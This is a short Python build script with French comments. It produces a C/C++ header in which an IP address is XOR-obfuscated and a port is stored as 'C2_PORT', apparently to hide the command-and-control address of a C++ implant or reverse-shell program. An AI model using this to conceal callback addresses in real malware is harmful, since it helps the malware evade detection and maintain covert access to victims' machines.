import sys

def xor_string(text, key):
    # Transforme le texte en tableau d'octets chiffrés
    output = "{"
    for char in text:
        encrypted_char = ord(char) ^ key
        output += f"0x{encrypted_char:02x}, "
    # Ajoute le null terminator chiffré si besoin, ou gère la longueur
    output = output.rstrip(", ") + "}"
    return output

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 gen_config.py <IP> <PORT>")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]
    KEY = 0x3B # La même clé que dans ton C++

    print(f"// Fichier généré automatiquement par le Makefile")
    print(f"#ifndef CONFIG_H")
    print(f"#define CONFIG_H")
    print(f"")
    print(f"// Configuration Obfusquée")
    print(f"const char XOR_KEY = 0x{KEY:02x};")
    print(f"")
    print(f"// IP: {ip}")
    print(f"char S_IP[] = {xor_string(ip, KEY)};")
    print(f"")
    print(f"// PORT: {port}")
    print(f"int C2_PORT = {port};")
    print(f"")
    print(f"#endif")